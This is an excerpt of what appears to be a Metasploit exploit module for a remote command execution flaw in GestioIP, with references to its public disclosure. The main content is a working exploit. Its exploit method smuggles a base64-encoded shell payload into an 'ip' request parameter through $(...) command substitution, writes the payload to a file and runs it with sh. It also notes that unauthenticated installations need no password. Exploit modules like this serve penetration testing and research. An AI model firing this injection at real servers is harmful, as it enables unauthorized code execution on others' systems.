...
script
        on the filesystem and execute it. If GestioIP is configured to 
use no authentication,
        no password is required to exploit the vulnerability. Otherwise, 
an authenticated
...
'http://sourceforge.net/p/gestioip/gestioip/ci/ac67be9fce5ee4c0438d27dfa5c1dcbca08c457c/' 
          ...
          [ 'URL', 
'https://github.com/rapid7/metasploit-framework/pull/2461' ], # First 
disclosure
          [ 'URL', 
'https://community.rapid7.com/community/metasploit/blog/2013/10/03/gestioip-authenticated-remote-command-execution-module' 
    ...
    [
      ...
      OptString.new('USERNAME', [false, 'The username to auth as', 
'gipadmin']),
      OptString.new('PASSWORD', [false, 'The password to auth with', 
nil])
    ], self.class)
  end
  ...
  def exploit
    ...
    options = {
      ...
      'encode_params' => false,
      'vars_get' => {
          'ip' => "2607:f0d0:$(echo${IFS}" + pay + 
"|base64${IFS}--decode|tee${IFS}"+file+"&&sh${IFS}"+file+"):0000:0000:0000:0000:0004",
          'hostname' => "fds",
          'client_id' => "1",
          'ip_version' => ""
      }
    ...
    if res and res.code == 401
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Please provide 
